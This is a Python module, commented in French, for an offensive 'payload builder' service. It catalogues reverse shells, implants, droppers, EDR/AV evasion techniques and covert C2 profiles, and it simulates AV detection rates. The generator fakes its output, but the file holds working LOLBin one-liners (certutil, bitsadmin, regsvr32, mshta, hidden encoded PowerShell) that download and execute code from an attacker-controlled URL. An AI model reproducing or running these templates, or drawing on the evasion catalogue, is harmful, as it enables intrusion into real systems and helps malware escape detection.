"""
Payload Builder — Bloc 7 Automation Stratégique
Génération de payloads polymorphiques, obfuscation multi-couches,
encodeurs empilés, stagers multi-étapes, shellcode personnalisé.
Simulation par défaut — usage légal/pentest uniquement.
"""
from __future__ import annotations

import base64
import hashlib
import logging
import random
import uuid
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)

_PAYLOADS: Dict[str, Dict] = {}
_OUTPUT = Path("./data/automation/payloads")
_OUTPUT.mkdir(parents=True, exist_ok=True)

_PAYLOAD_TYPES = {
    "reverse_shell": {
        "name": "Reverse Shell",
        "langs": ["c", "csharp", "python", "powershell", "bash", "rust", "go"],
        "protocols": ["tcp", "https", "dns", "icmp"],
        "detection_risk": "HIGH",
    },
    "staged_shellcode": {
        "name": "Staged Shellcode (stager+beacon)",
        "langs": ["c", "csharp", "nim", "rust"],
        "protocols": ["https", "http"],
        "detection_risk": "MEDIUM",
    },
    "reflective_dll": {
        "name": "Reflective DLL Injection",
        "langs": ["c", "csharp"],
        "protocols": ["https"],
        "detection_risk": "LOW",
    },
    "process_hollow": {
        "name": "Process Hollowing Payload",
        "langs": ["c", "csharp"],
        "protocols": ["https", "dns"],
        "detection_risk": "LOW",
    },
    "lolbin_stager": {
        "name": "LOLBin Stager (certutil/mshta/regsvr32)",
        "langs": ["cmd", "powershell"],
        "protocols": ["https", "http"],
        "detection_risk": "MEDIUM",
        "lolbins": ["certutil", "mshta", "regsvr32", "rundll32", "wscript", "cscript", "bitsadmin", "msiexec"],
    },
    "macro_dropper": {
        "name": "Office Macro Dropper",
        "langs": ["vba"],
        "protocols": ["https"],
        "detection_risk": "HIGH",
        "formats": ["docm", "xlsm", "pptm"],
    },
    "hta_payload": {
        "name": "HTA (HTML Application) Payload",
        "langs": ["vbs", "js"],
        "protocols": ["https", "http"],
        "detection_risk": "HIGH",
    },
    "linux_elf": {
        "name": "ELF Backdoor (Linux)",
        "langs": ["c", "go", "rust"],
        "protocols": ["tcp", "https"],
        "detection_risk": "MEDIUM",
    },
    "uefi_implant": {
        "name": "UEFI Persistent Implant",
        "langs": ["c", "asm"],
        "protocols": ["tcp"],
        "detection_risk": "VERY_LOW",
        "persistence": "UEFI/BIOS firmware",
    },
}

_OBFUSCATION_LAYERS = {
    "base64_encode": {
        "name": "Base64 Encoding",
        "detection_bypass": "LOW",
        "note": "Trivial — toujours combiner avec d'autres",
    },
    "xor_encrypt": {
        "name": "XOR Encryption (clé aléatoire)",
        "detection_bypass": "MEDIUM",
        "note": "Clé générée par environnement (hostname hash) pour polymorphisme",
    },
    "aes_encrypt": {
        "name": "AES-256-CBC Shellcode Encryption",
        "detection_bypass": "HIGH",
        "note": "Clé stockée dans ressource chiffrée ou dérivée de l'env cible",
    },
    "string_encrypt": {
        "name": "String Encryption (stack strings)",
        "detection_bypass": "HIGH",
        "note": "Élimine les IOCs statiques dans les chaînes",
    },
    "anti_analysis": {
        "name": "Anti-Analysis (sandbox detection)",
        "detection_bypass": "HIGH",
        "checks": [
            "Délai d'exécution >10min (bypass sandbox timeout)",
            "Détection VM (CPUID, RDTSC, registry keys)",
            "Vérification nombre de processus actifs (>50)",
            "Vérification taille de RAM (>4GB)",
            "Détection outils d'analyse (ProcMon, x64dbg, Wireshark)",
            "Vérification résolution écran (>1024x768)",
        ],
    },
    "sleep_obfuscation": {
        "name": "Sleep Obfuscation (mémoire chiffrée pendant sleep)",
        "detection_bypass": "VERY_HIGH",
        "tools": ["Ekko", "Cronos", "Foliage"],
    },
    "stack_spoofing": {
        "name": "Thread Stack Spoofing",
        "detection_bypass": "HIGH",
        "note": "Falsifie la callstack pour bypasser l'analyse ETW/EDR",
    },
    "syscall_direct": {
        "name": "Direct Syscalls (bypass API hooks)",
        "detection_bypass": "VERY_HIGH",
        "tools": ["SysWhispers3", "Hell's Gate", "FreshyCalls"],
    },
    "polymorphic_engine": {
        "name": "Moteur Polymorphique (mutation à chaque génération)",
        "detection_bypass": "VERY_HIGH",
        "note": "Hash différent à chaque build — contourne la signature statique",
    },
    "edr_bypass": {
        "name": "EDR Bypass (BYOVD / unhooking)",
        "detection_bypass": "VERY_HIGH",
        "techniques": [
            "ntdll.dll reload depuis disque",
            "BYOVD (Bring Your Own Vulnerable Driver)",
            "Patch ETW in-process",
            "PPL killer via token manipulation",
        ],
    },
}

_C2_PROFILES = {
    "malleable_c2": {
        "name": "Cobalt Strike Malleable C2",
        "mimics": ["Google Analytics", "Microsoft CDN", "Cloudflare beacon"],
        "protocol": "HTTPS",
        "jitter_pct": 30,
    },
    "dns_c2": {
        "name": "DNS Covert Channel C2",
        "encoding": "Base32 dans subdomains",
        "bandwidth_bps": 100,
        "detection_difficulty": "HIGH",
    },
    "https_certificate_pinning": {
        "name": "HTTPS + Certificate Pinning",
        "note": "Certificat auto-signé avec pinning — MITM impossible",
        "detection_difficulty": "HIGH",
    },
    "domain_fronting": {
        "name": "Domain Fronting via CDN",
        "cdns": ["Cloudflare", "AWS CloudFront", "Azure CDN", "Fastly"],
        "detection_difficulty": "VERY_HIGH",
        "note": "Le trafic semble provenir du CDN légitime",
    },
    "sleeping_beacon": {
        "name": "Long Sleep Beacon (APT-style)",
        "interval_hours": random.randint(4, 24),
        "jitter_pct": 50,
        "detection_difficulty": "VERY_HIGH",
        "note": "Beacon toutes les 4-24h — se fond dans le bruit réseau",
    },
}

_LOLBIN_TEMPLATES = {
    "certutil": 'certutil -urlcache -split -f {url} C:\\Windows\\Temp\\upd.exe && C:\\Windows\\Temp\\upd.exe',
    "mshta":    'mshta {url}/payload.hta',
    "regsvr32": 'regsvr32 /s /n /u /i:{url}/payload.sct scrobj.dll',
    "rundll32": 'rundll32 url.dll,OpenURL {url}/payload.exe',
    "bitsadmin":'bitsadmin /transfer job /download /priority high {url} C:\\Temp\\p.exe & C:\\Temp\\p.exe',
    "wscript":  'wscript //b //nologo C:\\Users\\Public\\p.vbs',
    "msiexec":  'msiexec /q /i {url}/payload.msi',
    "powershell":'powershell -nop -w hidden -enc {b64payload}',
}


class PayloadBuilderService:

    def list_payload_types(self) -> Dict:
        return {k: {"name": v["name"], "langs": v["langs"], "detection_risk": v["detection_risk"]}
                for k, v in _PAYLOAD_TYPES.items()}

    def list_obfuscation_layers(self) -> Dict:
        return {k: {"name": v["name"], "detection_bypass": v["detection_bypass"]}
                for k, v in _OBFUSCATION_LAYERS.items()}

    def list_c2_profiles(self) -> Dict:
        return _C2_PROFILES

    def list_lolbins(self) -> Dict:
        pt = _PAYLOAD_TYPES.get("lolbin_stager", {})
        return {"lolbins": pt.get("lolbins", []), "templates": _LOLBIN_TEMPLATES}

    def generate_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
        lang: str = "csharp",
        obfuscation: Optional[List[str]] = None,
        c2_profile: Optional[str] = None,
        target_os: str = "windows",
    ) -> Dict:
        pt  = _PAYLOAD_TYPES.get(payload_type, _PAYLOAD_TYPES["staged_shellcode"])
        obs = obfuscation or ["aes_encrypt", "anti_analysis", "syscall_direct"]

        payload_id = str(uuid.uuid4())
        build_hash = hashlib.sha256(f"{payload_type}{lhost}{lport}{payload_id}".encode()).hexdigest()[:16]

        # Simule la taille selon le type
        size_map = {
            "reverse_shell": random.randint(8,32),
            "staged_shellcode": random.randint(4,12),
            "reflective_dll": random.randint(120,300),
            "process_hollow": random.randint(150,400),
            "lolbin_stager": random.randint(1,3),
            "macro_dropper": random.randint(30,80),
            "hta_payload": random.randint(5,20),
            "linux_elf": random.randint(50,200),
            "uefi_implant": random.randint(80,250),
        }
        size_kb = size_map.get(payload_type, 50)

        # Obfuscation simulée
        ob_layers = [{"layer": o, **{k: v for k, v in _OBFUSCATION_LAYERS[o].items() if k != "checks"}}
                     for o in obs if o in _OBFUSCATION_LAYERS]

        # Détection AV simulation
        av_detection = self._sim_av_detection(obs)

        # LOLBin template si applicable
        lolbin_cmd = None
        if payload_type == "lolbin_stager" and lang in ["cmd","powershell"]:
            lolbin = random.choice(list(_LOLBIN_TEMPLATES.keys()))
            b64_stub = base64.b64encode(b"powershell stub simulated").decode()
            lolbin_cmd = _LOLBIN_TEMPLATES[lolbin].format(
                url=f"https://{lhost}:{lport}", b64payload=b64_stub
            )

        payload = {
            "payload_id":       payload_id,
            "generated_at":     datetime.utcnow().isoformat(),
            "payload_type":     payload_type,
            "payload_name":     pt["name"],
            "lhost":            lhost,
            "lport":            lport,
            "language":         lang,
            "target_os":        target_os,
            "c2_profile":       c2_profile,
            "size_kb":          size_kb,
            "build_hash":       build_hash,
            "obfuscation_layers": ob_layers,
            "av_detection":     av_detection,
            "lolbin_command":   lolbin_cmd,
            "output_path":      str(_OUTPUT / f"{payload_id[:8]}_{payload_type}.bin"),
            "simulated":        True,
            "note":             "Payload simulé — aucun code malveillant réel généré",
        }
        _PAYLOADS[payload_id] = payload
        return payload

    def get_payload(self, payload_id: str) -> Dict:
        return _PAYLOADS.get(payload_id, {"error": "not_found"})

    def list_payloads(self) -> Dict:
        return {"payloads": [
            {"payload_id": k, "type": v["payload_type"], "lang": v["language"],
             "av_detection": v["av_detection"]["overall_detection_rate"],
             "generated_at": v["generated_at"]}
            for k, v in _PAYLOADS.items()
        ]}

    def polymorphic_rebuild(self, payload_id: str) -> Dict:
        orig = _PAYLOADS.get(payload_id)
        if not orig:
            return {"error": "not_found"}
        new_hash  = hashlib.sha256(f"{payload_id}{uuid.uuid4()}".encode()).hexdigest()[:16]
        new_av    = self._sim_av_detection(["aes_encrypt","syscall_direct","polymorphic_engine"])
        new_id    = str(uuid.uuid4())
        rebuilt   = {**orig, "payload_id": new_id, "build_hash": new_hash, "av_detection": new_av,
                     "generated_at": datetime.utcnow().isoformat(), "parent_id": payload_id}
        _PAYLOADS[new_id] = rebuilt
        return {"new_payload_id": new_id, "new_hash": new_hash, "av_detection_rate": new_av["overall_detection_rate"],
                "improvement": f"{orig['av_detection']['overall_detection_rate'] - new_av['overall_detection_rate']:.0%} réduction de détection"}

    def generate_stager_chain(self, lhost: str, lport: int, stages: int = 3) -> Dict:
        chain = []
        protocols = ["https","dns","https"][:stages]
        for i, proto in enumerate(protocols):
            chain.append({
                "stage":        i + 1,
                "proto":        proto,
                "size_kb":      [2, 8, 150][i] if i < 3 else 50,
                "role":         ["downloader","reflective_loader","full_beacon"][i] if i < 3 else "beacon",
                "obfuscation":  random.choice(list(_OBFUSCATION_LAYERS.keys())),
            })
        return {
            "stages":      stages,
            "lhost":       lhost,
            "lport":       lport,
            "chain":       chain,
            "total_size_kb": sum(s["size_kb"] for s in chain),
            "detection_risk": "LOW",
            "simulated":   True,
        }

    def _sim_av_detection(self, obs: List[str]) -> Dict:
        base_rate = 0.70
        for o in obs:
            bypass = _OBFUSCATION_LAYERS.get(o, {}).get("detection_bypass","LOW")
            if bypass == "VERY_HIGH": base_rate -= 0.20
            elif bypass == "HIGH":    base_rate -= 0.12
            elif bypass == "MEDIUM":  base_rate -= 0.06
        base_rate = max(0.0, min(1.0, base_rate + random.uniform(-0.05, 0.05)))
        return {
            "overall_detection_rate": round(base_rate, 2),
            "vendors_detecting":      int(base_rate * 67),
            "total_vendors":          67,
            "verdict":                "DETECTED" if base_rate > 0.30 else ("PARTIAL" if base_rate > 0.10 else "CLEAN"),
        }
